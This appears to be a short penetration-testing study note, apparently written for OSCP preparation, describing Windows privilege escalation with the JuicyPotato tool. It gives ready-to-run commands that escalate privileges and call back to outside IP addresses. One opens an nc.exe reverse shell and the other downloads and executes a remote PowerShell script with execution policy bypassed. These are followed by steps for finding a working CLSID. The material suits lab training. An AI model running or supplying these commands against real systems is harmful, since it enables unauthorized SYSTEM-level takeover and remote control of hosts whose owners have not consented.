# Juicy Potato Priv Esc
Download the exe from here: `https://github.com/ohpe/juicy-potato/releases/tag/v0.1`
Suporting files are located at: `Scripts/OSCP/Win_Enum/Priv_Esc_Method/JuicyPotato/`
1. **Execute JuicyPotato.exe to see if default CLSID will work:**

a. Calling back using nc reverse shell:
`c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *`

b. Calling back using powershell reverse shell:
`.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *`

 2. **Default CLSID Not Working:**

  a. If Default Doesnt run, use the `GetCLSID.ps1` and `join-object.ps1` 
  
   - Load `join-object.ps1` into the powershell session using:
     `import-module join-object.ps1`
    
   - Execute `GetCLSID.ps1` using:
     `.\GetCLSID.ps1`

  b. download the `test_clsid.bat` and configure the following before execution:
   - Change the path to the `CLSID.list` variable
     
   - execute the .bat file
     
   - when the port number changes, it signifies a working CLSID

  c. Test CLSID with JuicyPotato command. 
